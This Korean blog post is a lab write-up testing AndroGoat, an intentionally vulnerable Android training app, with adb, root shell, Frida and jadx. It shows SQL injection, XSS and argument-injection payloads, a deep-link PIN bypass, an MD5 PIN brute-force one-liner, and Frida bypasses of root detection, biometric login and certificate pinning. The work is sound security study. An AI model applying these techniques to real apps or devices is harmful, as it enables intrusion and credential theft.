---
layout: post
title: "AndroGoat - Kotlin으로 만든 취약 앱을 에뮬레이터에서 직접 뜯어보기"
date: 2026-09-02 20:00:00 +0900
category: 안드로이드
author: WTCY
tags: [Android, AndroidSecurity, 모바일보안, OWASP, AndroGoat, Kotlin, Frida, adb, jadx, 정적분석, 동적분석, 취약점실습, 학습기록]
excerpt: "MASTG Playground를 끝내고 안드로이드 실습 자료를 더 찾다가 깃허브에서 AndroGoat을 봤습니다. Kotlin으로 만든 첫 취약 앱이라길래 API33 에뮬레이터에 올려 카테고리별로 직접 눌러 봤습니다. 평문 저장·하드코딩된 AWS/OpenAI 키·무방비 컴포넌트·SQL/OS 커맨드 인젝션·WebView 파일 절도·XSS·클립보드/키보드 유출·생체인증과 SSL 피닝 우회까지, adb·run-as·root·logcat·sqlite·Frida로 값을 뽑아 확인한 기록입니다."
---

> 대상: [satishpatnayak/AndroGoat](https://github.com/satishpatnayak/AndroGoat) — Kotlin으로 만든 교육용 의도적 취약 안드로이드 앱 (release v2.0.1)
> 환경: Windows 11 + Android x86_64 에뮬레이터(API 33), 배포된 `AndroGoat.apk`, adb / jadx / Frida 17

MASTG Hacking Playground를 끝내고 나서도 실습할 앱이 더 필요했습니다. 깃허브를 뒤지다
AndroGoat을 만났습니다. "Kotlin으로 만든 최초의 취약 앱"이라는 소개 한 줄에 끌려 바로
받았습니다. MASTG 앱이 오래된 Java 앱이었다면, 이건 targetSdk 33짜리 요즘 Kotlin 앱입니다.
scoped storage, 백그라운드 클립보드 제한 같은 최신 정책이 전부 살아 있는 환경입니다. 옛날
취약점이 여기서는 어떻게 되는지, 그게 보고 싶었습니다.

앱을 열면 저장소, 컴포넌트, 입력검증, 측면채널, 하드코딩, 루트/에뮬레이터 탐지, 바이너리
패칭, 생체인증이 카테고리 메뉴로 늘어서 있습니다. 항목을 누르면 해당 취약점 화면으로
들어갑니다.

![AndroGoat 메인 메뉴 — 카테고리 버튼들 아래로, exported BroadcastReceiver를 adb로 발화시키자 "Username is CrazyUser, Password is CrazyPassword and Key is 123myKe…" 토스트가 뜬 화면](/assets/img/androgoat/androgoat-home.png)

이번엔 카테고리를 하나씩 에뮬레이터에서 실제로 발화시켰습니다. 값은 `adb`, `run-as`,
`adb root`, `logcat`, `sqlite`, `Frida`, 프록시로 직접 뽑아 확인했습니다. 저장소부터 컴포넌트,
입력검증, 측면채널, 하드코딩, 탐지우회, 생체인증, 네트워크까지 빠짐없이 눌러 봤습니다. 글은
성격이 비슷한 것끼리 묶었습니다.

---

## 0. 환경

배포된 `AndroGoat.apk`(릴리스 v2.0.1)를 받아 뜯어보니 두 가지가 편했습니다. 하나는 네이티브
라이브러리가 없다는 점입니다. 순수 Kotlin/Java라 ABI를 가릴 것 없이 아무 에뮬레이터에나
설치됩니다. MASTG에서 겪은 SQLCipher ARM 문제 같은 게 여기엔 없었습니다. 다른 하나는
`targetSdk`가 33이라는 점입니다. 그래서 API 33 에뮬레이터가 이 앱엔 가장 잘 맞습니다.

```console
$ aapt dump badging AndroGoat.apk | grep -E 'package|targetSdk|debuggable'
package: name='owasp.sat.agoat' ...
targetSdkVersion:'33'
application-debuggable

$ adb install -r -g AndroGoat.apk
Success
$ adb root
adbd is already running as root
```

디버그 빌드(`debuggable=true`)라 `run-as`로 앱 프라이빗 저장소에 바로 들어갑니다. API 33
구글 API 이미지라 `adb root`까지 됩니다. 접근권 두 개를 손에 쥐고 시작했습니다. 테스트 케이스
액티비티는 대부분 `exported=false`라 셸에서 직접 못 켭니다. 이런 화면은 메뉴 버튼을 눌러 실제
사용자처럼 발화시켰습니다. 디버그 빌드에 `adb root`까지 붙으니 셸이 START_ANY_ACTIVITY를
쥐게 되는데, 화면 이동이 꼬일 때는 `am start -n`으로 비노출 액티비티를 직접 띄웠습니다.

---

## 1. 로컬 저장소

앱이 자격증명을 어디에 넣든 — SharedPreferences든 SQLite든 임시파일이든 외부저장소든 —
암호화만 없으면 `run-as`나 `adb root`로 그대로 읽힙니다.

### 1-1. SharedPreferences

로그인 화면에 아이디와 비밀번호를 넣으면 `getSharedPreferences("users", MODE_PRIVATE)`에
평문 그대로 저장됩니다.

```console
$ adb shell run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/shared_prefs/users.xml
<map>
    <string name="password">P@ssw0rd123</string>
    <string name="username">admin</string>
</map>
```

### 1-2. 미암호화 SQLite (+ 로그 유출)

SQLite 화면은 자격증명을 평문 DB에 넣습니다. 저장 쿼리까지 통째로 logcat에 남깁니다.

```console
$ adb exec-out run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/databases/aGoat > aGoat.db
$ xxd aGoat.db | head -1
00000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300   SQLite format 3.   # 암호화 안 됨
$ sqlite3 aGoat.db "SELECT * FROM users;"
1|admin|s3cret

$ adb logcat -s Query
V Query: INSERT INTO users (username, password) VALUES('admin','s3cret')
```

`SQLite format 3` 매직이 그대로 보인다는 건 DB가 암호화되지 않았다는 뜻입니다. 여기에 INSERT
문까지 로그로 새니, 자격증명이 빠져나가는 길이 둘입니다. (이 저장 쿼리는 문자열 보간이라 SQL
인젝션도 열려 있습니다.)

### 1-3. 임시파일

임시파일 화면은 `File.createTempFile()`로 앱 디렉터리에 파일을 만듭니다. 그런데 지우질 않으니
평문이 영구히 남습니다.

```console
$ adb shell run-as owasp.sat.agoat ls /data/data/owasp.sat.agoat/ | grep tmp
users7351421958311838811tmp
$ adb shell run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/users7351421958311838811tmp
username is admin
password is P@ssw0rd123
```

### 1-4. 외부저장소 (SD Card)

외부저장소 화면은 `getExternalFilesDir()`에 평문을 쓰고, 저장 경로마저 로그로 흘립니다.

```console
$ adb shell cat /storage/emulated/0/Android/data/owasp.sat.agoat/files/users*_tmp
This data is stored in SdCard on Tue Sep 01 ...:
 Username - admin Password -P@ssw0rd123

$ adb logcat -s Info
I Info: Data saved to/storage/emulated/0/Android/data/owasp.sat.agoat/files/users..._tmp
```

여기서 API 33의 scoped storage를 한 번 짚고 갑니다. 앱은 `/sdcard` 루트가 아니라 앱 전용
외부 경로(`Android/data/<pkg>/files`)에 값을 씁니다. 다른 앱 눈에는 안 띕니다. 그렇다고
`adb shell`·`adb root`·`adb pull`까지 막히는 건 아닙니다. "타 앱에는 안 보인다"가 곧
"안전하다"는 아닙니다.

---

## 2. 하드코딩된 시크릿

이 앱은 시크릿을 소스에 상수로 박아 뒀습니다. 그것도 모자라 화면이며 로그로 그대로
내보냅니다. 박아 둔 값은 DEX 문자열로 남으니 `strings`나 jadx로 뽑히고, 런타임에도 노출됩니다.

### 2-1. AWS 키

클라우드 서비스 화면은 AWS 액세스 키와 시크릿 키를 소스에 담아 두고, `Log.d`로 logcat에
그대로 찍습니다.

```console
$ adb logcat -s "[Info]"
D [Info]: Connected to AWS account using Access key AKIAX56QKK…7G7ABC and
          secret key OviCwsFNWeoC…c1kCsfV+lOABCw   # 앱에 박힌 데모 키(일부 마스킹)
```

![클라우드 서비스 화면 — AWS 액세스 키와 시크릿 키가 담긴 다이얼로그가 그대로 표시된다](/assets/img/androgoat/cloud-aws.png)

`AKIA`로 시작하는 장기 IAM 키가 앱 안에 박혀 있고, 로그로도 흘러나옵니다. `gitleaks`나
`trufflehog` 같은 스캐너가 대번에 잡아내는 전형적인 패턴입니다.

### 2-2. OpenAI 키

AI Chat 화면은 OpenAI API 키를 상수로 들고 있다가 다이얼로그와 토스트로 보여줍니다.

```console
$ adb shell pm path owasp.sat.agoat        # base.apk 위치
$ adb pull <base.apk> . && unzip -p base.apk classes*.dex | strings | grep 'sk-'
sk-abcdef1234567890abcdef1234567890abcdef12
```

### 2-3. 프로모코드 (클라이언트 측 인가)

쇼핑 화면은 할인 검증을 서버가 아니라 앱 안에서 처리합니다. `promoCode = "NEW2019"`라는
상수에 입력을 맞춰 보고, 일치하면 가격을 클라이언트 쪽에서 0으로 깎습니다. 그 값을 그대로
넣으면 바로 공짜입니다.

![쇼핑 화면 — 프로모코드 NEW2019 입력 후 "Congratulations! You got this product for free" 다이얼로그가 뜬다](/assets/img/androgoat/promo-free.png)

---

## 3. 무방비 컴포넌트

이 앱은 ContentProvider, BroadcastReceiver, Service, Activity를 권한 하나 없이 `exported=true`로
열어 뒀습니다. 그러니 아무 앱이나, 심지어 `adb`가 직접 부를 수 있습니다.

### 3-1. exported ContentProvider

프로바이더가 권한 없이 열려 있습니다. `content` 도구로 질의하면 시드된 자격증명이 통째로
쏟아집니다.

```console
$ adb shell content query --uri content://owasp.sat.agoat.provider.userpinsprovider/user_pins
Row: 0 id=3, username=Admin, pin=Admin
Row: 1 id=1, username=AndroGoat, pin=AndroGoat
Row: 2 id=2, username=root, pin=toor
```

### 3-2. exported BroadcastReceiver

리시버도 무방비입니다. `am broadcast` 한 줄이면 하드코딩된 자격증명을 토스트로 뱉어 냅니다.
앱이 이 브로드캐스트를 스스로 보낸 적은 한 번도 없습니다. 글 맨 위 메뉴 스크린샷에 뜬 토스트가
바로 이렇게 뽑은 값입니다.

```console
$ adb shell am broadcast -n owasp.sat.agoat/.ShowDataReceiver
Broadcasting: Intent { cmp=owasp.sat.agoat/.ShowDataReceiver }
Broadcast completed: result=0
# 화면 토스트: Username is CrazyUser, Password is CrazyPassword and Key is 123myKey456
```

### 3-3. exported Service

인보이스 다운로드 서비스도 권한 없이 열려 있습니다. 비특권 셸에서 다운로드를 강제로 걸 수
있습니다.

```console
$ adb shell am start-service -n owasp.sat.agoat/.DownloadInvoiceService
$ adb logcat -s DOWNLOAD
I DOWNLOAD: Service onCreate
I DOWNLOAD: Invoice is being downloaded
```

### 3-4. 딥링크로 PIN 게이트 우회

접근제어 화면은 PIN을 넣어야 다음 화면으로 넘어갑니다. 문제는 그 다음 화면
(`AccessControl1ViewActivity`)입니다. `exported=true`에 커스텀 딥링크까지 달고 있으면서 정작
PIN은 확인하지 않습니다. PIN 화면을 통째로 건너뛰고 딥링크로 곧장 들어가면 그만입니다.

```console
$ adb shell am start -a android.intent.action.VIEW -d "androgoat://vulnapp"
Starting: Intent { act=android.intent.action.VIEW dat=androgoat://vulnapp/... }
# PIN 한 번 안 넣고 보호 화면(Download Invoice)이 그대로 열림
```

![PIN을 전혀 입력하지 않았는데 딥링크로 바로 열린 보호 화면 — Download Invoice 기능이 노출돼 있다](/assets/img/androgoat/deeplink-bypass.png)

웹페이지에 `<a href="androgoat://vulnapp">` 한 줄만 심어 둬도 같은 우회가 통합니다.

### 3-5. PIN 저장은 솔트 없는 MD5

딥링크로 건너뛸 수 있으니 PIN 자체는 이미 의미가 없습니다. 그래도 저장 방식은 따로 볼
만합니다. PIN을 정상적으로 설정하고 저장소를 열면, 솔트 없는 MD5 해시 하나가 놓여 있습니다.
겨우 4자리 숫자라 오프라인에서 전수로 돌리면 원문이 곧바로 떨어집니다.

```console
$ adb shell run-as owasp.sat.agoat cat /data/data/owasp.sat.agoat/shared_prefs/pinDetails.xml
<map>
    <boolean name="pinSet" value="true" />
    <string name="pin">88cf91a1aef212f3c2cd12406983427d</string>
</map>

$ python -c "import hashlib;[print('PIN',f'{i:04d}') for i in range(10000) if hashlib.md5(f'{i:04d}'.encode()).hexdigest()=='88cf91a1aef212f3c2cd12406983427d']"
PIN 7391
```

해시가 곧 원문입니다. 설정해 둔 PIN은 `7391`이었고, 저장된 MD5를 0000–9999로 한 바퀴 돌리자
그대로 복원됐습니다.

---

## 4. WebView와 XSS

이 앱의 WebView는 세 화면 — URL 로드, 이름 표시, QR 스캔 — 에서 자바스크립트를 켜 둔 채
입력을 정제 없이 렌더합니다. 위험도는 화면마다 다릅니다. 하나씩 실제로 돌려 봤습니다.

### 4-1. WebView URL

WebView URL 화면은 로드 버튼을 누르는 순간 위험한 파일 접근 플래그를 죄다 켭니다. 그러고는
입력한 URL을 검증 없이 그대로 로드합니다.

```java
webViewSettings.setJavaScriptEnabled(true);
webViewSettings.setAllowFileAccess(true);
webViewSettings.setAllowFileAccessFromFileURLs(true);
webViewSettings.setAllowUniversalAccessFromFileURLs(true);
$webView.loadUrl($urlEditText.getText().toString());   // 검증 없음
```

API 30부터 `setAllowFileAccess`의 기본값은 false입니다. 그런데 이 코드가 관련 플래그 셋을
전부 true로 되살려 놓습니다. 이제 URL 칸에 `file://`로 앱 샌드박스 파일 경로를 넣으면, WebView가
그 파일을 읽어 화면에 그려 줍니다. 앱 프라이빗 디렉터리에 비밀 파일 하나(`secret.txt`)를 심어
놓고 그 경로를 불러 봤습니다.

![WebView URL 화면 — file:///data/data/owasp.sat.agoat/files/secret.txt 를 로드하자 앱 프라이빗 파일 내용 "AGOAT_SECRET_PIN=4321 (this file lives in the app private sandbox)" 이 그대로 렌더된다](/assets/img/androgoat/webview-fileread.png)

다른 앱은 손도 못 대는 `/data/data/<pkg>/files` 속 파일이 WebView 화면에 그대로 떴습니다.
`setAllowUniversalAccessFromFileURLs`가 true인 게 여기서 더 아픕니다. 한 발 더 밀면 `file://`
페이지가 그 파일 내용을 원격 서버로 XHR 전송하는 것, 곧 파일 절도까지 열립니다.

### 4-2. XSS

XSS 화면은 이름 칸에 넣은 값을 `document.write(a.value)`로 DOM에 곧장 씁니다. 정제가 없으니
HTML이든 JS든 그대로 실행됩니다.

```javascript
function displayContent(){ var a=document.getElementById("name"); document.write(a.value); }
```

`<script>`는 document.write로 밀어 넣어도 실행되지 않습니다. 대신 `onerror`나 `onload`
핸들러는 실행됩니다. 이름 칸에 페이로드를 넣고 Display를 눌렀습니다. 입력 칸이 WebView 안
HTML input이라 타이핑이 자꾸 튀어서, 앱의 실제 `displayContent()`를 그대로 부르는 경로로
발화시켰습니다. 그러자 페이로드가 페이지를 다시 그렸습니다.

![XSS 화면 — onerror 핸들러가 실행돼 페이지를 다시 그린 결과. 빨간 배너 "XSS EXECUTED", origin: about:blank, UA: Mozilla/5.0 (Linux; Android 13; sdk_gphone64_x86_64 …) Chrome/109](/assets/img/androgoat/xss-alert.png)

JS가 실제로 돌면서 페이지를 통째로 갈아엎고 UA까지 긁어 왔습니다. 한 가지 한계가 있습니다.
`loadDataWithBaseURL(null, ...)`이라 오리진이 `about:blank`, 곧 불투명 오리진입니다. 스크립트는
돌지만 쿠키나 `file://` 파일에는 닿지 못합니다. 파일 절도까지는 아니고, JS 실행과 화면 변조에서
멈추는 XSS입니다.

### 4-3. QR 코드 XSS

QR 화면은 카메라로 읽은 QR 텍스트를 HTML 문자열에 그대로 이어 붙인 뒤 `loadData`로
렌더합니다. QR 안에 HTML이나 JS가 들어 있으면 그대로 실행됩니다.

에뮬레이터 기본 후면 카메라는 `virtualscene`이라 실제 QR을 비출 방법이 없습니다. QR을 읽는
단계만 Frida로 대신했습니다. 앱이 디코드한 뒤 실행하는 것과 똑같은 `loadData` 싱크에 공격
문자열을 그대로 흘려 넣은 것입니다. 싱크 그 다음, 곧 WebView의 JS 실행부터는 전부 실제입니다.

![QR 화면 — 위쪽은 virtualscene 카메라, 아래 WebView에 주입된 페이로드가 실행돼 "QR-XSS EXECUTED" 초록 배너와 origin: data:text/html 이 렌더된 화면](/assets/img/androgoat/qrcode-xss.png)

여기도 `loadData`가 null baseURL이라 오리진이 `data:text/html`, 불투명입니다. JS 실행과 DOM
변조, 원격 유출까지는 되지만 로컬 파일 읽기는 막힌, 앱 내부 WebView XSS입니다.

---

## 5. 주입

### 5-1. SQL 인젝션

SQLi 화면은 입력을 쿼리에 곧바로 이어 붙입니다. 아이디 칸에 `' OR '1'='1` 하나만 넣으면
조건이 늘 참이 되고, 계정이 통째로 딸려 나옵니다. users 테이블은 앞의 SQLite 화면에서 이미
시드된 상태입니다.

![SQLi 화면 — 아이디 칸에 ' OR '1'='1 을 넣자 "Users Found: Username: (admin) password: (s3cret)" 다이얼로그가 뜬다](/assets/img/androgoat/sqli.png)

### 5-2. OS 커맨드 인젝션

OS 커맨드 화면은 입력을 `"ping " + 입력` 꼴로 붙여 `Runtime.exec`에 그대로 넘깁니다.

```java
String ip1 = "ping " + ((Object) $ip.getText());
Process p = Runtime.getRuntime().exec(ip1);
```

`exec(String)`은 공백으로 토큰을 쪼개 `execve`를 직접 호출합니다. 셸(`/bin/sh`)을 거치지
않습니다. 그러니 `;`·`|`·`$()` 같은 메타문자로 새 명령을 이어 붙이는 진짜 RCE는 통하지
않습니다. 통하는 건 공백입니다. 공백이 그대로 인자 경계가 되니, IP 칸에 `127.0.0.1 -c 3`을
넣으면 `-c 3`이 ping의 독립 인자로 딸려 들어갑니다. Frida로 exec 싱크를 들여다보면 주입한
인자가 그대로 도착해 있습니다.

```console
# 입력: 127.0.0.1 -c 3
[OSCMD] Runtime.exec(String) => ping 127.0.0.1 -c 3   # -c 3 이 별도 argv 로 주입됨
```

그렇다면 이 싱크로 임의 명령까지 갈 수 있느냐. 그걸 정직하게 확인하려고 같은 exec 인자를
Frida로 `id`로 바꿔 봤습니다. 결과 창에 uid가 그대로 찍혔습니다. 셸만 한 겹 끼었어도 UI
입력만으로 나왔을 값입니다.

![OS 커맨드 화면 — 입력을 exec 싱크에서 id로 바꾸자 결과 창에 "uid=10195(u0_a195) gid=10195(u0_a195) groups=… context=u:r:untrusted_app:s0:…" 가 출력된다](/assets/img/androgoat/oscmd-rce.png)

선을 그어 보면 이렇습니다. UI만으로 되는 건 인자 주입까지입니다. 공백이 별도 argv가 되는 데서
멈춥니다. 임의 바이너리 실행은 exec에 셸이 없어 막혀 있고, 그 벽을 넘는 건 Frida로 인자를 갈아
끼우는 방식으로만 실증했습니다.

---

## 6. 측면 채널과 로그

화면에서 별표로 가려 놨더라도, 값이 로그나 클립보드, 키보드 캐시 같은 OS 공용 채널로 한 번
새면 그대로 읽힙니다.

### 6-1. 안전하지 않은 로깅

로깅 화면은 비밀번호 칸이 화면에서 마스킹돼 있어도 소용없습니다. 코드가 입력값을 그대로
로그에 찍어 버립니다.

```console
$ adb logcat -s "Info:" System.out
I Info: : Username: agoatuser and Password: Sup3rS3cr3t!27 are verified
I System.out: Username: agoatuser and Password: Sup3rS3cr3t!27 are verified
```

API 33에서는 다른 앱이 남의 로그를 못 읽습니다(READ_LOGS 제한). 하지만 호스트의 `adb logcat`은
아무 제약 없이 전부 걷어 갑니다. 개발자나 adb가 지켜보는 채널에서는 그대로 샙니다.

### 6-2. 클립보드

클립보드 화면은 카드 정보를 받으면 4자리 OTP를 만들고, 그걸 전역 시스템 클립보드에 그대로
붙입니다.

```java
int otp = ...(1000..9999);
ClipData clip = ClipData.newPlainText("CC Card", String.valueOf(otp));
clipboard.setPrimaryClip(clip);   // 전역 클립보드
```

화면에는 "OTP Generated and Copied: 9736" 다이얼로그가 뜹니다. 같은 값이 그대로 클립보드에
올라갑니다. API 33은 백그라운드 앱이 클립보드를 읽는 걸 막습니다. 그래서 값은 앱이 포그라운드일
때, 또는 앱 안에서 읽어야 합니다. 앱 프로세스 안에서 도는 Frida로 `setPrimaryClip`을 후킹해
값을 낚아챘더니, 화면 OTP와 한 자리도 다르지 않았습니다.

```console
[CLIP] setPrimaryClip label=CC Card  text=9736
```

![클립보드 화면 — "OTP Generated and Copied: 9736" 다이얼로그. 같은 9736이 전역 클립보드에 올라가 Frida 후킹으로 잡힌다](/assets/img/androgoat/clipboard-otp.png)

전역 클립보드에 올라간 OTP는 포그라운드에 떠 있는 아무 앱이나 읽어 갈 수 있습니다.

### 6-3. 키보드 캐시

키보드 캐시 화면의 아이디/비밀번호 EditText에는 레이아웃에 `android:inputType`이 아예
없습니다.

```xml
<EditText android:id="@+id/userName" .../>   <!-- inputType 없음 -->
<EditText android:id="@+id/password" .../>   <!-- textPassword 도, textNoSuggestions 도 없음 -->
```

`textPassword`가 빠졌으니 비밀번호가 화면에 평문으로 그대로 보입니다. `textNoSuggestions`도
없으니 소프트 키보드가 입력을 학습하고 캐시합니다. 두 칸에 눈에 띄는 값을 넣어 봤습니다.
비밀번호가 가려지지 않는 게 화면에 그대로 드러납니다. 그 상태에서 키보드(Gboard)의 학습 캐시
DB를 root로 열었습니다.

![키보드 캐시 화면 — 목표가 "기기에 저장된 키스트로크 로그 찾기". 비밀번호 MyP4ssword9910 이 마스킹 없이 평문으로 표시된다](/assets/img/androgoat/keyboard-cache.png)

```console
$ IME=com.google.android.inputmethod.latin
$ adb shell "grep -ril -e SecretUser8842 -e MyP4ssword9910 /data/data/$IME/ 2>/dev/null"
/data/data/com.google.android.inputmethod.latin/databases/trainingcachev3.db

# DB를 뽑아 문자열 확인
SecretUser8842: FOUND
MyP4ssword9910: FOUND
```

아이디는 물론 비밀번호까지 키보드의 `trainingcachev3.db`에 고스란히 남았습니다. 이 캐시는 IME
샌드박스 안이라 읽으려면 root가 필요합니다. 다른 앱은 들여다볼 수 없습니다. 그 전제만 갖추면
입력한 자격증명이 그대로 튀어나옵니다.

---

## 7. 탐지 우회

AndroGoat이 MASTG 앱과 갈리는 지점이 이 카테고리입니다. 루트 탐지든 에뮬레이터 탐지든 전부
클라이언트 쪽 판정입니다. 판정 함수 하나만 Frida로 뒤집으면 통째로 무력화됩니다.

### 7-1. 루트 탐지 우회

루트 탐지라 해 봐야 `su` 같은 파일이 있는지 `File.exists()`로 훑는 게 전부입니다. 먼저 그 경로에
파일을 심어 일부러 탐지를 시켰습니다(before). 파일은 그대로 둔 채 `isRooted()`만 Frida로
false로 후킹했습니다(after). 판정이 그대로 뒤집힙니다.

```console
$ adb shell touch /data/local/su     # 탐지 경로에 아티팩트 심기
# Check Root 탭 → "Device is rooted"

$ frida -U -p <pid> -l root.js       # isRooted() -> false
[ROOT] isRooted() hooked -> false
# 파일은 그대로인데 Check Root 탭 → "Device is not rooted"
```

<div style="display:flex;gap:10px;flex-wrap:wrap">
  <img src="/assets/img/androgoat/root-detected.png" alt="su 파일을 심은 상태에서 Check Root를 누르자 Device is rooted 다이얼로그가 뜬 화면" style="max-width:48%"/>
  <img src="/assets/img/androgoat/root-bypassed.png" alt="같은 su 파일이 있는데 Frida로 isRooted를 false로 후킹한 뒤 Check Root를 누르자 Device is not rooted 다이얼로그가 뜬 화면" style="max-width:48%"/>
</div>

파일이 멀쩡히 있는데도 "not rooted"가 뜨는 것, 그게 우회의 증거입니다.

### 7-2. 에뮬레이터 탐지 우회

에뮬레이터 탐지도 마찬가지입니다. `Build.FINGERPRINT`·`MODEL` 같은 문자열에
`sdk`·`x86`·`goldfish` 토큰이 섞였는지 보는 게 전부입니다. 에뮬이니 당연히 걸립니다. 그런데
`isEmulator()`를 Frida로 false로 후킹하면 "실기기"로 통과해 버립니다.

```console
# Check Emulator 탭 → "This device is an Emulator"
$ frida -U -p <pid> -l emu.js        # isEmulator() -> false
# Check Emulator 탭 → "This device is not an Emulator"
```

### 7-3. 바이너리 패칭

바이너리 패칭 화면은 관리자 여부를 `private val isAdmin = false`라는 컴파일타임 상수 하나로
잠가 둡니다. 챌린지 이름 그대로, 정답은 smali에서 그 상수를 `0x0 → 0x1`로 바꿔 다시 패키징하는
것입니다. Kotlin `val`은 final 필드라 런타임 후킹은 타이밍이 까다롭습니다. 그래서 이 화면은
잠긴 상태만 확인하고, 정적 패칭이 정공법임을 적어 둡니다. 서버 검증 없이 로컬 상수 하나를
믿는 게 근본 결함입니다.

---

## 8. 생체 인증

생체 인증 화면은 안내 문구(목표 5번)부터 대놓고 "Bypass Biometric authentication using Frida"라고
적어 놨습니다. 코드를 열어 보면 이유가 분명합니다.

```java
biometricManager.canAuthenticate(255);          // 255 = STRONG|WEAK|DEVICE_CREDENTIAL
biometricPrompt.authenticate(promptInfo);        // CryptoObject 없음
// onAuthenticationSucceeded(): Toast/Dialog "Authentication succeeded!" 만
```

인증이 `CryptoObject` 하나 없이 이벤트로만 묶여 있습니다. 성공했다고 키스토어 키가 풀리는
것도 아닙니다. 성공 콜백이 다이얼로그를 띄우는 게 전부입니다. 그러니 그 콜백만 강제로 부르면,
센서를 한 번도 건드리지 않고 통과합니다. API 33 에뮬레이터에는 지문 하드웨어가 없습니다.
그런데 애초에 CryptoObject가 없으니 지문 등록조차 필요 없습니다. Frida로 성공 콜백을 그대로
호출했습니다.

```console
[+] forced onAuthenticationSucceeded(null) with NO sensor event
```

![생체 인증 화면 — 지문을 등록/터치한 적 없이 Frida로 성공 콜백을 부르자 "Biometric login / Authentication succeeded!" 다이얼로그가 뜬 화면](/assets/img/androgoat/biometric-bypass.png)

센서 이벤트는 단 한 번도 없었습니다. 그런데 "Authentication succeeded!"가 떴습니다. 인증
성공이라는 게 위조할 수 있는 이벤트에 불과하다는 뜻입니다.

---

## 9. 네트워크

Network Intercepting 화면은 OkHttp로 평문 `http://demo.testfire.net`을 호출합니다. 프록시를
걸면 요청이 평문 그대로 흘러갑니다.

```console
$ adb shell settings put global http_proxy 10.0.2.2:8888
# HTTP 버튼 탭 → 호스트 리스너에 잡힌 요청:
GET http://demo.testfire.net/ HTTP/1.1
Host: demo.testfire.net
User-Agent: okhttp/4.9.3
```

같은 화면에 인증서 피닝(OkHttp3 `CertificatePinner`) 버튼도 붙어 있습니다. 그런데 핀 문자열이
소스에 평문으로 박혀 있습니다.

```java
new CertificatePinner.Builder()
  .add("owasp.org", "sha256/5gsjyidrmWjcLRClfCk+Dd6O0nx1CyFrVUW5wVkwEx0=")
  .add("owasp.org", "sha256/kIdp6NNEd8wsugYyyIYFsi1ylMCED3hZbSR8ZFsa/A4=")
  .add("owasp.org", "sha256/mEflZT5enoR1FuXLgYYGqnVEoZvmf9c2bVBpiOjYQ0c=")
  .build();
```

이 에뮬레이터는 외부로 나가는 기본 라우트와 DNS가 막혀 있습니다. qemu가 ICMP만 특수 처리해서
`ping 8.8.8.8`은 되지만, 실제 TCP/TLS는 밖으로 나가지 못합니다. owasp.org로 진짜 핸드셰이크를
걸 수는 없었다는 뜻입니다. 그러니 피닝 우회는 프로세스 안에서 정직하게 보였습니다. 앱에 박힌
그 핀 3개로 `CertificatePinner`를 똑같이 다시 만들고, 맞지 않는 인증서로 `check()`를 한 번 불러
봤습니다. 그런 다음 한 줄짜리 Frida 훅을 걸고 같은 호출을 반복했습니다.

```console
[*] rebuilt app CertificatePinner with 3 hardcoded owasp.org pins
[before] check() THREW -> pinning is enforced: SSLPeerUnverifiedException: Certificate pinning failure!
[hook] CertificatePinner.check() neutralized for host=owasp.org
[after]  check() RETURNED with the same wrong cert -> pinning DEFEATED
```

훅을 걸기 전에는 맞지 않는 인증서를 정확히 걷어 냈습니다(피닝 동작). 한 줄 훅을 걸고 나니 같은
인증서가 그대로 통과했습니다(피닝 무력화). 핀이 앱 코드 레벨에 있으니 이렇게 손쉽게 뒤집힙니다.

---

## 마치며

카테고리는 MASTG 앱보다 넓었지만, 결론은 조금도 다르지 않았습니다. 기기 안에 평문으로 둔 건
뭐든 나왔습니다. SharedPrefs, SQLite, 임시파일, 외부저장, 로그, 클립보드, 키보드 캐시, DEX
문자열까지 전부 뽑혔습니다. 클라이언트가 내리는 판정은 죄다 뒤집혔습니다. 루트와 에뮬레이터
탐지, 생체 인증 성공, 프로모코드, isAdmin 상수, 인증서 피닝이 그랬습니다. 권한 없이 열어 둔
컴포넌트 — ContentProvider, Receiver, Service, 딥링크 — 는 그대로 남의 진입점이 됐습니다.
WebView는 켜 둔 플래그만큼 위험이 불어나서, 파일 접근을 열어 두자 앱 프라이빗 파일까지
읽혔습니다. 방어랄 게 사실 뻔합니다. 비밀도 판정도 서버로 옮겨 크립토에 묶고, 컴포넌트는 기본
닫힘에 권한을 걸고, 입력은 파라미터 바인딩으로, WebView는 파일 접근을 끄는 것입니다.

이번엔 Kotlin으로 만든 요즘 앱(targetSdk 33)이라, 옛 취약점이 최신 안드로이드에서 어떻게
걸러지는지를 나란히 볼 수 있어 재미있었습니다. 외부저장은 scoped storage로 앱 전용 경로에
갇히고, 타 앱의 로그와 클립보드 읽기는 막히고, WebView 파일 접근 기본값은 false로 바뀌었습니다.
그런데 코드가 그걸 하나씩 되살려 놓으면 다시 뚫린다는 것, 그것도 이번에 그대로 확인했습니다.
카메라(QR)와 외부 TLS 핸드셰이크(피닝)는 에뮬레이터 사정상 한 조각을 Frida로 대신하거나
프로세스 안에서 보였습니다. 그 대목은 어디까지가 실제이고 어디부터가 대체인지 본문에 숨김없이
적어 뒀습니다. 깃허브에서 찾은 연습용 앱 하나로 이만큼 훑어볼 수 있어서 좋았습니다.
긴 글 읽어 주셔서 감사합니다.
